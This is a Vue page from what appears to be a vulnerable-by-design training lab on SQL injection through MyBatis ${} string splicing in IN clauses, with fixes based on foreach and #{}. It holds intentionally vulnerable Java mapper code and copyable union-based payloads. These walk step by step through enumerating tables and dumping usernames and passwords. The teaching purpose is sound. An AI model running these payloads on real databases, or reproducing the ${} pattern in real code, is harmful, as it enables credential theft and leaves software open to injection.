<template>
  <vuln-template
    title="SQL注入 - MyBatis IN"
    subtitle="SQL Injection - MyBatis IN"
    level="高危"
    :icon="DatabaseOutlined"
  >
    <template #description>
      <a-typography-paragraph>
        <strong>MyBatis IN注入</strong>是指在使用IN子句时,使用${}拼接导致SQL注入。
      </a-typography-paragraph>
      <a-typography-paragraph>
        MyBatis IN注入的特点：
      </a-typography-paragraph>
      <ul>
        <li>IN子句需要多个值，容易使用${}拼接</li>
        <li>使用${}直接拼接导致SQL注入</li>
        <li>可以通过时间盲注或报错注入获取数据</li>
        <li>常见于批量查询功能</li>
        <li>应该使用foreach标签和#{}</li>
      </ul>
    </template>

    <template #payload>
      <a-typography-paragraph>
        常见的IN注入payload：
      </a-typography-paragraph>
      <a-typography-paragraph code copyable>1,2,3</a-typography-paragraph>
      <a-space direction="vertical" style="width: 100%">
        <span style="color: #95a5a6">正常的ID列表</span>
      </a-space>
      
      <a-typography-paragraph code copyable style="margin-top: 12px">1,2,3) or 1=1--</a-typography-paragraph>
      <a-space direction="vertical" style="width: 100%">
        <span style="color: #95a5a6">闭合IN子句并注入恒真条件</span>
      </a-space>

      <a-typography-paragraph code copyable style="margin-top: 12px">1,2,3) union select 1,2,3--</a-typography-paragraph>
      <a-space direction="vertical" style="width: 100%">
        <span style="color: #95a5a6">联合查询注入</span>
      </a-space>

      <a-alert
        message="IN子句必须使用foreach标签和#{}，不能直接使用${}！"
        type="warning"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #test-form>
      <a-form :model="formState" @finish="handleSubmit" layout="vertical">
        <a-form-item
          label="输入ID列表"
          name="ids"
          :rules="[{ required: true, message: '请输入ID列表' }]"
        >
          <a-input
            v-model:value="formState.ids"
            size="large"
            placeholder="输入ID列表，用逗号分隔（如：1,2,3）"
          />
        </a-form-item>

        <a-form-item>
          <a-space>
            <a-button type="primary" html-type="submit" size="large" :loading="loading">
              <template #icon><play-circle-outlined /></template>
              执行测试
            </a-button>
            <a-button size="large" @click="handleReset">
              <template #icon><redo-outlined /></template>
              重置
            </a-button>
          </a-space>
        </a-form-item>
      </a-form>
    </template>

    <template #input-hint>
      <a-alert message="攻击示例流程" type="warning" show-icon style="margin-bottom: 12px;" />
      <p><strong>完整攻击流程：</strong></p>
      <ol style="padding-left: 20px; margin-bottom: 0; line-height: 2;">
        <li><strong>步骤1：</strong>测试注入点 - 输入 <a-typography-text code copyable>1,2,3) or 1=1--</a-typography-text>，如果返回所有数据，说明存在注入</li>
        <li><strong>步骤2：</strong>判断字段数 - 输入 <a-typography-text code copyable>1,2,3) order by 1--</a-typography-text>，逐步增加数字</li>
        <li><strong>步骤3：</strong>联合查询 - 输入 <a-typography-text code copyable>1,2,3) union select 1,2,3--</a-typography-text>，确定显示位置</li>
        <li><strong>步骤4：</strong>获取数据库名 - 输入 <a-typography-text code copyable>1,2,3) union select 1,database(),3--</a-typography-text></li>
        <li><strong>步骤5：</strong>获取表名 - 输入 <a-typography-text code copyable>1,2,3) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--</a-typography-text></li>
        <li><strong>步骤6：</strong>获取列名 - 输入 <a-typography-text code copyable>1,2,3) union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--</a-typography-text></li>
        <li><strong>步骤7：</strong>获取数据 - 输入 <a-typography-text code copyable>1,2,3) union select 1,username,password from users--</a-typography-text></li>
      </ol>
    </template>

    <template #result v-if="result">
      <div class="result-content">
        <pre style="color: #1890ff; margin: 0;">{{ result }}</pre>
      </div>
      <a-alert
        message="如果返回了多条数据或异常数据，说明存在IN注入漏洞。"
        type="info"
        show-icon
        style="margin-top: 16px"
      />
    </template>

    <template #source-code>
      <a-typography-paragraph>
        <strong>后端源码（存在漏洞）：</strong>
      </a-typography-paragraph>
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="sourceCode" style="margin: 0;">
          <pre class="code-block"><code>// Controller层
@RestController
@RequestMapping("/home/sqli/mybatis")
public class MyBatis {
    @RequestMapping("/in")
    public String in(String ids) {
        // 漏洞：直接将用户输入的ids字符串传递给Service，没有验证
        ArrayList&lt;Admin&gt; adminList = injectService.in(ids);
        // 返回结果...
    }
}

// DAO层 - 使用@Select注解
@Mapper
public interface InjectDao {
    // 漏洞：使用${ids}直接拼接，不做转义
    // 攻击者可以输入: 1,2,3) or 1=1 -- 来闭合IN子句并注入SQL
    @Select("Select * from users where id in (${ids})")
    ArrayList&lt;Admin&gt; in(@Param("ids") String ids);
    
    // 注释中提到了安全写法，但实际代码使用了不安全的${}
    // 正确安全写法: 使用foreach标签和#{item}
}</code></pre>
      </a-typography-paragraph>
      </div>
      <a-alert
        message="漏洞点：MyBatis中使用${ids}直接拼接SQL，${}不会进行转义。攻击者可以输入1,2,3) or 1=1 --来闭合IN子句并注入SQL语句。IN子句应该使用foreach标签配合#{}。"
        type="error"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #fix>
      <a-typography-paragraph>
        <strong>修复建议：</strong>
      </a-typography-paragraph>
      <ul style="padding-left: 20px; line-height: 2;">
        <li><strong>使用foreach标签：</strong>使用MyBatis的foreach标签遍历ID列表</li>
        <li><strong>使用#{}：</strong>在foreach中使用#{}而不是${}</li>
        <li><strong>输入验证：</strong>验证ID列表格式，只允许数字和逗号</li>
        <li><strong>数量限制：</strong>限制IN子句中值的数量，避免过长</li>
        <li><strong>类型转换：</strong>将字符串转换为整数数组，确保类型安全</li>
        <li><strong>参数类型：</strong>使用List或Array类型，而不是String类型</li>
      </ul>
      
      <div style="margin-top: 16px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode1" style="margin: 0;">
          <pre class="code-block"><code>// 错误示例(易受攻击)
        @Select("Select * from users where id in (${ids})")
        ArrayList&lt;Admin&gt; in(@Param("ids") String ids);
// 攻击者可以输入: 1,2,3) or 1=1 --</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode2" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例1：使用foreach标签和#{}
        // MyBatis注解方式（使用script标签）
        @Select({
            "&lt;script&gt;",
            "SELECT * FROM users WHERE id IN",
            "&lt;foreach item='item' collection='ids' open='(' separator=',' close=')'&gt;",
            "#{item}",
            "&lt;/foreach&gt;",
            "&lt;/script&gt;"
        })
        ArrayList&lt;Admin&gt; in(@Param("ids") List&lt;Integer&gt; ids);
        // 注意：MyBatis注解中使用script标签需要用数组形式
        // #{item}会被转义，无法注入SQL
// 注意：上面的script标签是MyBatis的特殊标签，不是HTML的script标签</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode3" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例2：使用MyBatis XML配置
        &lt;select id="in" resultType="Admin"&gt;
            SELECT * FROM users WHERE id IN
            &lt;foreach collection="ids" item="id" open="(" separator="," close=")"&gt;
                #{id}
            &lt;/foreach&gt;
&lt;/select&gt;</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode4" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例3：Controller层验证和转换
        @RequestMapping("/in")
        public String in(String ids) {
            // 1. 验证格式（只允许数字和逗号）
            if (!ids.matches("^[0-9,]+$")) {
                throw new IllegalArgumentException("ID列表格式错误");
            }
            
            // 2. 分割并转换为整数列表
            String[] idArray = ids.split(",");
            List&lt;Integer&gt; idList = new ArrayList&lt;&gt;();
            
            // 3. 限制数量
            if (idArray.length > 100) {
                throw new IllegalArgumentException("ID数量过多，最多100个");
            }
            
            // 4. 转换并验证每个ID
            for (String idStr : idArray) {
                try {
                    int id = Integer.parseInt(idStr.trim());
                    if (id < 1 || id > 10000) {
                        throw new IllegalArgumentException("ID超出范围: " + id);
                    }
                    idList.add(id);
                } catch (NumberFormatException e) {
                    throw new IllegalArgumentException("无效的ID: " + idStr);
                }
            }
            
            // 5. 调用Service，传入List类型
            ArrayList&lt;Admin&gt; adminList = injectService.in(idList);
            // 返回结果...
}</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode5" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例4：Service和DAO接口修改
        // Service接口
        ArrayList&lt;Admin&gt; in(List&lt;Integer&gt; ids);
        
        // DAO接口
        ArrayList&lt;Admin&gt; in(@Param("ids") List&lt;Integer&gt; ids);
        
        // XML映射
        &lt;select id="in" resultType="Admin"&gt;
            SELECT * FROM users WHERE id IN
            &lt;foreach collection="ids" item="id" open="(" separator="," close=")"&gt;
                #{id}
            &lt;/foreach&gt;
&lt;/select&gt;</code></pre>
      </a-typography-paragraph>
      </div>
    </template>
  </vuln-template>
</template>

<script setup>
import { reactive, ref } from 'vue'
import { message } from 'ant-design-vue'
import { DatabaseOutlined, PlayCircleOutlined, RedoOutlined } from '@ant-design/icons-vue'
import VulnTemplate from '@/components/VulnTemplate.vue'
import axios from 'axios'

const loading = ref(false)
const result = ref('')

const sourceCode = `// Controller层
@RestController
@RequestMapping("/home/sqli/mybatis")
public class MyBatis {
    @RequestMapping("/in")
    public String in(String ids) {
        // 漏洞：直接将用户输入的ids字符串传递给Service，没有验证
        ArrayList<Admin> adminList = injectService.in(ids);
        // 返回结果...
    }
}

// DAO层 - 使用@Select注解
@Mapper
public interface InjectDao {
    // 漏洞：使用\${ids}直接拼接，不做转义
    // 攻击者可以输入: 1,2,3) or 1=1 -- 来闭合IN子句并注入SQL
    @Select("Select * from users where id in (\${ids})")
    ArrayList<Admin> in(@Param("ids") String ids);
    
    // 注释中提到了安全写法，但实际代码使用了不安全的\${}
    // 正确安全写法: 使用foreach标签和#{item}
}`

const fixCode1 = `// 错误示例(易受攻击)
@Select("Select * from users where id in (\${ids})")
ArrayList<Admin> in(@Param("ids") String ids);
// 攻击者可以输入: 1,2,3) or 1=1 --`

const fixCode2 = `// 正确示例1：使用foreach标签和#{}
// MyBatis注解方式（使用script标签）
@Select({
    "&lt;script&gt;",
    "SELECT * FROM users WHERE id IN",
    "&lt;foreach item='item' collection='ids' open='(' separator=',' close=')'&gt;",
    "#{item}",
    "&lt;/foreach&gt;",
    "&lt;/script&gt;"
})
ArrayList<Admin> in(@Param("ids") List<Integer> ids);
// 注意：MyBatis注解中使用script标签需要用数组形式
// #{item}会被转义，无法注入SQL
// 注意：上面的script标签是MyBatis的特殊标签，不是HTML的script标签`

const fixCode3 = `// 正确示例2：使用MyBatis XML配置
&lt;select id="in" resultType="Admin"&gt;
    SELECT * FROM users WHERE id IN
    &lt;foreach collection="ids" item="id" open="(" separator="," close=")"&gt;
        #{id}
    &lt;/foreach&gt;
&lt;/select&gt;`

const fixCode4 = `// 正确示例3：Controller层验证和转换
@RequestMapping("/in")
public String in(String ids) {
    // 1. 验证格式（只允许数字和逗号）
    if (!ids.matches("^[0-9,]+$")) {
        throw new IllegalArgumentException("ID列表格式错误");
    }
    
    // 2. 分割并转换为整数列表
    String[] idArray = ids.split(",");
    List<Integer> idList = new ArrayList<>();
    
    // 3. 限制数量
    if (idArray.length > 100) {
        throw new IllegalArgumentException("ID数量过多，最多100个");
    }
    
    // 4. 转换并验证每个ID
    for (String idStr : idArray) {
        try {
            int id = Integer.parseInt(idStr.trim());
            if (id < 1 || id > 10000) {
                throw new IllegalArgumentException("ID超出范围: " + id);
            }
            idList.add(id);
        } catch (NumberFormatException e) {
            throw new IllegalArgumentException("无效的ID: " + idStr);
        }
    }
    
    // 5. 调用Service，传入List类型
    ArrayList<Admin> adminList = injectService.in(idList);
    // 返回结果...
}`

const fixCode5 = `// 正确示例4：Service和DAO接口修改
// Service接口
ArrayList<Admin> in(List<Integer> ids);

// DAO接口
ArrayList<Admin> in(@Param("ids") List<Integer> ids);

// XML映射
<select id="in" resultType="Admin">
    SELECT * FROM users WHERE id IN
    <foreach collection="ids" item="id" open="(" separator="," close=")">
        #{id}
    </foreach>
</select>`

const formState = reactive({
  ids: ''
})

const handleSubmit = async () => {
  loading.value = true
  try {
    const response = await axios.get('/home/sqli/mybatis/in', {
      params: formState
    })
    result.value = response.data
    message.success('测试完成')
  } catch (error) {
    message.error('测试失败：' + (error.response?.data || error.message))
  } finally {
    loading.value = false
  }
}

const handleReset = () => {
  formState.ids = ''
  result.value = ''
}
</script>
